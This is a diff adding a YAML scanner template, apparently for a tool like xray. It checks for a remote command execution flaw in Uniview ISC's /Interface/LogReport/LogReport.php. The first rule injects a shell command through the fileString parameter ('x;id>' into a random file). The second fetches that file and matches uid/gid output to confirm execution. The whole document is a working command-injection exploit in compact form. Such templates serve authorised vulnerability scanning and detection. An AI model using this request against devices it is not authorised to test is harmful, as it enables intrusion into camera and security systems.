@@ -1,0 +1,18 @@
+name: uniview-isc-logreport-php-rce
+set:
+  randstr: randomLowercase(22)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>{{randstr}}.txt
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /Interface/LogReport/{{randstr}}.txt
+    expression: response.status == 200 &&  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1()
+detail:
+    links:
+        - 宇视LogReport.php rce
